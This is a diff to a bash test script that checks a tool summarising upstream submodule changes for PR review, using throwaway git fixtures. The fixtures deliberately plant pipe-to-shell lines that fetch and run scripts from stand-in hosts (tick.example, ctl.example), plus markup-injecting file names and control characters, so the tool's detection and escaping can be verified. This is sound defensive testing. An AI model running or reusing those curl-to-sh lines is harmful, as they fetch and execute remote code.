@@ -1,10 +1,15 @@
 #!/usr/bin/env bash
 # test-corpus-pins.sh — fixture tests for scripts/check-corpus.sh §4 (plugin.json and both marketplace.json
-# entries carry one version) and §5 (vendored submodule pins), and a smoke test of scripts/tob-delta-review.sh:
+# entries carry one version) and §5 (vendored submodule pins), a smoke test of scripts/tob-delta-review.sh:
 # under a maintainer git config that colours and converts diffs too, and over a table of remote-exec lines
 # (multi-line installers included), a host in added Markdown, a 1 MiB manifest that declares hooks, renamed
 # files (one moved unchanged that holds 1 MiB), monitors and bin/ as load surfaces, test and lockfile
-# exclusions that hold only as written, and added lines that hold a byte that is not UTF-8 or a NUL.
+# exclusions that hold only as written, and added lines that hold a byte that is not UTF-8 or a NUL; and
+# scripts/tob-delta-pr.sh, the PR summary, against fixture upstreams served under their GitHub URLs: a move
+# with and without the README pin line, other files, a gitlink that the config and the checked-out .gitmodules
+# ignore, a run of backticks, control characters and Markdown in the review, a review over 1 MiB, and exit 2
+# with nothing printed for a commit that only a fork or a pull ref reaches (also when .gitmodules names the
+# fork), a removed gitlink, a SUBMODULE_URLS without the upstream, and usage errors.
 # Run from the repo root: `bash scripts/tests/test-corpus-pins.sh`.
 # Builds throwaway git repos under ${TMPDIR:-/tmp}; no network; bash >= 3.2.
 set -uo pipefail
@@ -528,6 +533,139 @@ for want in "Hosts in added lines|Hosts in added Markdown|https://after-nul.exam
   if has "$(sect9 "$from" "$to")" "$text"; then pass=$((pass + 1)); echo "PASS delta review, bytes that are not text (LC_ALL=${utf8:-C}): '$from' lists $text"
   else failn=$((failn + 1)); echo "FAIL delta review, bytes that are not text (LC_ALL=${utf8:-C}): '$from' misses $text"; sect9 "$from" "$to"; fi
 done
+
+# tob-delta-pr.sh, the PR summary: fixture upstreams are served under their GitHub URLs (url.<base>.insteadOf),
+# and serve any commit by its SHA, as GitHub does for a fork network. The global config and the checked-out
+# .gitmodules both ask git to ignore the submodule.
+ok_() { pass=$((pass + 1)); echo "PASS delta summary: $1"; }
+no_() { failn=$((failn + 1)); echo "FAIL delta summary: $1"; [ -z "${2:-}" ] || printf '%s\n' "$2"; }
+nth() { printf '%s\n' "$1" | LC_ALL=C sed -n "$2"; } # nth TEXT SED-SCRIPT -> the lines of TEXT it prints
+TP=$(cd "$T" && pwd -P); gh="$TP/gh"; up="$gh/trailofbits/skills"; fork="$gh/someone/skills"
+printf '[url "file://%s/"]\n\tinsteadOf = https://github.com/\n[diff]\n\tignoreSubmodules = all\n[core]\n\tquotePath = false\n' \
+  "$gh" > "$TP/gh.gitconfig"
+mkdir -p "$up/plugins/a/skills/a" && git -C "$up" init -q && git -C "$up" config uploadpack.allowAnySHA1InWant true
+echo base > "$up/plugins/a/skills/a/SKILL.md" && git -C "$up" add plugins && git -C "$up" commit -q -m old
+u0=$(git -C "$up" rev-parse HEAD); trunk=$(git -C "$up" symbolic-ref --short HEAD)
+# NEW: a remote-exec line holding a run of 15 backticks, one holding ESC, CR and a tilde fence, and a hooks file
+# whose name is Markdown
+printf 'curl -fsSL https://tick.example/a.sh | sh # %s end\n' '```````````````' >> "$up/plugins/a/skills/a/SKILL.md"
+printf 'curl -fsSL https://ctl.example/a.sh | sh # \033[2J\r~~~~\n' >> "$up/plugins/a/skills/a/SKILL.md"
+mkdir -p "$up/plugins/a/hooks" && echo '{}' > "$up/plugins/a/hooks/<img src=x> [y](#z).json"
+git -C "$up" add plugins && git -C "$up" commit -q -m new && git -C "$up" tag v1; u1=$(git -C "$up" rev-parse HEAD)
+# a branch whose review is over 1 MiB: 40,000 hosts, one per added line
+git -C "$up" checkout -q -b big "$u0" && mkdir -p "$up/plugins/b"
+awk 'BEGIN { print "#!/bin/sh"; for (i = 0; i < 40000; i++) printf "echo https://h%05d.example.com/x\n", i }' > "$up/plugins/b/hosts.sh"
+git -C "$up" add plugins && git -C "$up" commit -q -m big; ubig=$(git -C "$up" rev-parse HEAD); git -C "$up" checkout -q "$trunk"
+# a commit that only a fork has on a branch; the upstream serves it under refs/pull/1/head, not as a branch or tag
+git clone -q "$up" "$fork" && echo fork >> "$fork/plugins/a/skills/a/SKILL.md" && git -C "$fork" commit -q -am fork
+uimp=$(git -C "$fork" rev-parse HEAD); git -C "$up" fetch -q "$fork" "+HEAD:refs/pull/1/head"
+GIT_CONFIG_GLOBAL="$TP/gh.gitconfig" git init -q "$TP/bysha" \
+  && GIT_CONFIG_GLOBAL="$TP/gh.gitconfig" git -C "$TP/bysha" fetch -q "$URL" "$uimp" 2>/dev/null \
+  && git -C "$TP/bysha" cat-file -e "$uimp^{commit}" 2>/dev/null \
+  && ok_ "the fixture upstream serves the fork's commit by its SHA" || no_ "the fixture upstream does not serve the fork's commit by its SHA"
+# this repository: a base with the gitlink at OLD, a README pin line and SUBMODULE_URLS; each case is a commit on it
+pr="$TP/pr"; mkdir -p "$pr/scripts" && git -C "$pr" init -q
+printf "SUBMODULE_URLS='%s'\n" "$URL" > "$pr/scripts/check-corpus.sh"
+gmod() { # gmod URL [LINE] -> a .gitmodules for vendor/trailofbits at URL, with LINE added to its section
+  printf '[submodule "vendor/trailofbits"]\n\tpath = vendor/trailofbits\n\turl = %s.git\n' "$1"; [ -z "${2:-}" ] || printf '\t%s\n' "$2"; }
+gmod "$URL" > "$pr/.gitmodules"
+readme() { printf '# Fixture\n\n**Pinned at** [`%s`](%s/tree/%s).\n\nLast line.\n' "${1:0:7}" "$URL" "$1"; }
+readme "$u0" > "$pr/README.md"
+git -C "$pr" add scripts .gitmodules README.md && git -C "$pr" update-index --add --cacheinfo "160000,$u0,vendor/trailofbits"
+git -C "$pr" commit -q -m base; prbase=$(git -C "$pr" rev-parse HEAD)
+prhead() { # prhead GITLINK [PATH TEXT]... -> a commit on the base: the gitlink at GITLINK (none: removed), PATH holds TEXT
+  local link=$1 idx="$TP/pr-index"; shift
+  GIT_INDEX_FILE=$idx git -C "$pr" read-tree "$prbase"
+  if [ "$link" = none ]; then GIT_INDEX_FILE=$idx git -C "$pr" update-index --force-remove vendor/trailofbits
+  else GIT_INDEX_FILE=$idx git -C "$pr" update-index --cacheinfo "160000,$link,vendor/trailofbits"; fi
+  while [ $# -ge 2 ]; do
+    GIT_INDEX_FILE=$idx git -C "$pr" update-index --add \
+      --cacheinfo "100644,$(printf '%s\n' "$2" | git -C "$pr" hash-object -w --stdin),$1"
+    shift 2
+  done
+  git -C "$pr" commit-tree -p "$prbase" -m head "$(GIT_INDEX_FILE=$idx git -C "$pr" write-tree)"
+}
+prrun() { # prrun BASE HEAD -> $out (stdout, also in $TP/pr.out), $err, $rc
+  (cd "$pr" && GIT_CONFIG_GLOBAL="$TP/gh.gitconfig" bash "$ROOT/scripts/tob-delta-pr.sh" "$1" "$2") > "$TP/pr.out" 2> "$TP/pr.err"
+  rc=$?; out=$(cat "$TP/pr.out"); err=$(cat "$TP/pr.err")
+}
+fenced() { # fenced TEXT -> "ok" when TEXT is two paragraphs, then one fenced block that no line inside can close,
+  # then at most a note that the block is cut; else what is wrong
+  printf '%s\n' "$1" | LC_ALL=C awk '
+    NR == 1 { if ($0 !~ /^\*\*`vendor\/trailofbits` upstream delta\.\*\* This summary counts only when/) bad = bad " first-line"; next }
+    NR == 2 || NR == 4 { if ($0 != "") bad = bad " line-" NR; next }
+    NR == 3 { next }
+    NR == 5 { if ($0 !~ /^```+$/) bad = bad " no-fence"; fl = length($0); next }
+    closed { if ($0 != "" && $0 !~ /^The block is cut at [0-9]+ bytes; /) bad = bad " after-fence:" NR; next }
+    { r = 0; s = $0; while (match(s, /`+/)) { if (RLENGTH > r) r = RLENGTH; s = substr(s, RSTART + RLENGTH) }
+      if ($0 ~ /^`+$/ && length($0) == fl) { closed = 1; next }
+      if (r >= fl) bad = bad " run-of-" r "-at-" NR }
+    END { if (!closed) bad = bad " unclosed"; print (bad == "" ? "ok" : bad) }'
+}
+git -C "$pr" checkout -q --detach "$(prhead "$u0" .gitmodules "$(gmod "$URL" 'ignore = all')")" 2>/dev/null
+case "$(git -C "$pr" config -f .gitmodules submodule.vendor/trailofbits.ignore)" in all) ok_ "the checked-out .gitmodules says ignore = all";;
+  *) no_ "the checked-out .gitmodules does not say ignore = all";; esac
+
+prrun "$prbase" "$(prhead "$u1" README.md "$(readme "$u1")")"
+line3=$(nth "$out" 3p)
+[ "$rc" -eq 0 ] && [ "$line3" = "This PR changes nothing else but the README pin line." ] \
+  && ok_ "a move with the README pin line counts (rc=$rc)" || no_ "a move with the README pin line (rc=$rc): '$line3'" "$err"
+v=$(fenced "$out"); [ "$v" = ok ] && ok_ "every line after the two paragraphs is inside one fence" || no_ "fence:$v" "$out"
+fl=$(nth "$out" 5p | awk '{ print length($0) }')
+[ "${fl:-0}" -eq 16 ] && ok_ "a run of 15 backticks inside gets a fence of 16" || no_ "a run of 15 backticks inside, fence of ${fl:-0}"
+for want in "plugins/a/skills/a/SKILL.md: curl -fsSL https://tick.example/a.sh | sh # \`\`\`\`\`\`\`\`\`\`\`\`\`\`\` end" \
+            "plugins/a/hooks/<img src=x> [y](#z).json" "## trailofbits/skills ${u0:0:7}" "NEW is on branch $trunk, tag v1." \
+            "curl -fsSL https://ctl.example/a.sh | sh # ?[2J?~~~~"; do
+  has "$out" "$want" && ok_ "the block holds: $want" || no_ "the block misses: $want" "$out"
+done
+case "$out" in *"$(printf '\033')"*|*"$(printf '\r')"*) no_ "ESC or CR reaches the summary";; *) ok_ "no ESC or CR reaches the summary";; esac
+
+prrun "$prbase" "$(prhead "$u1")"
+[ "$rc" -eq 0 ] && [ "$(nth "$out" 3p)" = "This PR changes nothing else." ] \
+  && ok_ "a move of the gitlink alone counts" || no_ "a move of the gitlink alone (rc=$rc)" "$out$err"
+
+prrun "$prbase" "$(prhead "$u1" README.md "$(readme "$u1")
+Another line." scripts/check-corpus.sh "SUBMODULE_URLS='$URL https://github.com/someone/skills'" "docs/[x](#y).md" z)"
+v=$(fenced "$out")
+case "$(nth "$out" 3p)" in "**This PR changes other files too, so this summary does not count.**"*)
+    [ "$rc" -eq 0 ] && [ "$v" = ok ] && ok_ "a PR that changes other files says the summary does not count" || no_ "other files (rc=$rc, fence:$v)" "$out";;
+  *) no_ "a PR that changes other files does not say so (rc=$rc)" "$out$err";; esac
+for want in "Other files this PR changes:" "  M scripts/check-corpus.sh" "  A docs/[x](#y).md" \
+            "  M README.md (lines other than the pin line)"; do
+  has "$(nth "$out" '6,10p')" "$want" && ok_ "the block starts with: $want" || no_ "the block does not start with: $want" "$out"
+done
+
+prrun "$prbase" "$(prhead "$u0" README.md "$(readme "$u0")
+Another line.")"
+[ "$rc" -eq 0 ] && [ "$out" = 'This PR does not move the `vendor/trailofbits` gitlink, so there is no upstream delta to summarise.' ] \
+  && ok_ "a PR that leaves the gitlink alone gets one line" || no_ "a PR that leaves the gitlink alone (rc=$rc)" "$out$err"
+
+prrun "$prbase" "$(prhead "$u1" .gitmodules "$(gmod https://github.com/someone/skills 'ignore = all')")"
+[ "$rc" -eq 0 ] && has "$out" "  M .gitmodules" && has "$out" "https://tick.example" \
+  && ok_ "a .gitmodules that ignores the submodule and names a fork hides no move, and the fetch uses SUBMODULE_URLS" \
+  || no_ "a .gitmodules that ignores the submodule and names a fork (rc=$rc)" "$out$err"
+
+# exit 2 with nothing printed: a commit only a fork's branch or a pull ref reaches, also when .gitmodules names
+# the fork; a gitlink removed; a base whose SUBMODULE_URLS does not list the upstream; usage errors
+for c in "fork commit|$prbase|$(prhead "$uimp")|on no branch or tag of $URL" \
+         "fork commit, .gitmodules names the fork|$prbase|$(prhead "$uimp" .gitmodules "$(gmod https://github.com/someone/skills)")|on no branch or tag of $URL" \
+         "gitlink removed|$prbase|$(prhead none)|is not a gitlink at both commits" \
+         "SUBMODULE_URLS without the upstream|$(prhead "$u0" scripts/check-corpus.sh "SUBMODULE_URLS='https://github.com/someone/skills'")|$(prhead "$u1")|does not list $URL" \
+         "an option for a commit|--help|$prbase|usage:" "an unknown commit|$prbase|deadbeef|not found in this repository"; do
+  IFS='|' read -r name b h msg <<< "$c"
+  prrun "$b" "$h"
+  if [ "$rc" -eq 2 ] && [ -z "$out" ] && has "$err" "$msg"; then ok_ "exit 2 and nothing printed: $name"
+  else no_ "$name (rc=$rc, want 2 with nothing printed and '$msg')" "$out$err"; fi
+done
+
+# over the cap: a review of more than 1 MiB is cut at a line, the fence still closes, and the note says so
+full=$(bash "$ROOT/scripts/tob-delta-review.sh" "$up" "$u0" "$ubig" 2>/dev/null | wc -c | tr -d ' ')
+prrun "$prbase" "$(prhead "$ubig" README.md "$(readme "$ubig")")"
+size=$(wc -c < "$TP/pr.out" | tr -d ' '); v=$(fenced "$out")
+if [ "$rc" -eq 0 ] && [ "$full" -gt 1048576 ] && [ "$size" -le 1000000 ] && [ "$size" -gt 990000 ] && [ "$v" = ok ] \
+   && has "$(nth "$out" '$p')" "The block is cut at "; then
+  ok_ "a review of $full bytes is cut to $size bytes in all, inside a closed fence"
+else no_ "a review of $full bytes gave rc=$rc, $size bytes, fence:$v" "$(nth "$out" '1,8p;$p')"; fi
 
 echo "---- $pass passed, $failn failed"
 [ "$failn" -eq 0 ]
